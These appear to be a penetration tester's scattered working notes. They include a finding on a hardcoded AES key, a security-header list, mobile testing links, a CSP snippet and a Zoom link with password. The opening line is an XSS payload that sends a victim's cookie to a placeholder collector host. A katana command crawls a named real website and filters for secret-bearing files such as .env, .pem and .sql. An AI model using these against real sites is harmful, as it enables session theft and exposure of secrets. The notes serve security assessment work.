Get Victim cookie 
<img src=x onerror="document.location='http://burpcollaboratorLink?c='+document.cookie;" />

Exposure of AES Encryption Key in Source Code
Description 
During the assessment of the INSTA DOC APPLICATION 's login functionality, it was observed that the sensitive encryption keys are hardcoded stored in plaintext within the application's codebase which is compromising the security of encrypted data. 

impact 
Attackers can easily access the encryption key by analyzing the application's source code. With access to the key, they can decrypt sensitive data encrypted using AES encryption algorithms. This exposes confidential information, such as user credentials, personal details, and financial data, to unauthorized access and potential theft 

Solution 
To address this vulnerability, implement the following:
Implement robust key management practices to safeguard AES encryption keys. Store keys in secure, encrypted storage repositories or key management systems that enforce strong access controls and auditing mechanisms. 

good reads 
https://cwe.mitre.org/data/definitions/310.html 



Install Katana from the following website: 
https://medium.com/@sherlock297/katana-framework-how-to-use-it-to-scan-and-mass-collect-website-data-107f5ae326e0 

echo https://www.adyen.com | katana | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"
echo https://www.adyen.com | katana | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"

It is recommended to remove duplicate http headers. Also implement all useful security headers as this is a primary defense against high severity attacks.

Please Remove Duplicate HTTP header:-
1.Cache-Control: private,no-cache, no-store, must-revalidate, pre-check=0, post-check=0, max-age=0, s-maxage=0

2.Pragma: no-cache

3.X-Frame-Options: DENY

4.X-XSS-Protection: 1; mode=block

5.Referrer-Policy: strict-origin

6.X-Content-Type-Options: nosniff

7.X-Permitted-Cross-Domain-Policies: none

8.Content-Security-Policy: default-src 'self'

9.Strict-Transport-Security: max-age=31536000; include Subdomains

10.Access-Control-Allow-Origin: 

11.Access-Control-Allow-Headers: Content-Type

12.Access-Control-Allow-Methods: GET,POST

13.Access-Control-Allow-Credentials: false


https://us06web.zoom.us/j/85966910847?pwd=nRBlJAb8R2rKH9PAZUMkRGPRzSbhwP.1

Mobile:-
https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet
https://github.com/ivan-sincek/android-penetration-testing-cheat-sheet
https://github.com/linkedin/qark
https://github.com/St3v3nsS/MMSF
https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05c-reverse-engineering-and-tampering
https://flippingbitz.com/post/2018-09-21-objection-remote-device-app-hook/ = (Objection) Mobile apps on remote device
https://gowthamr1.medium.com/android-ssl-pinning-bypass-using-objection-and-frida-scripts-f8199571e7d8 = Android SSL Pinning Bypass Using Objection and Frida Scripts



Website:-

API:-
======================================================

https://www.ideadrops.info/post/cat-grep-cut-sort-uniq-sed-with-powershell


Download the extension -- https://chromewebstore.google.com/detail/user-agent-switcher/dbclpoekepcmadpkeaelmhiheolhjflj 
User-Agent Switcher extension to the applications which are not able to run on the specific browser. 


if the CSP Headaer has added different tags and while removing it changes the layout of the application: 
To log blocked resources for debugging, you can add a reporting URL:
<add name="Content-Security-Policy" value="
    default-src 'self';
    report-uri /csp-violation-report;
"/>



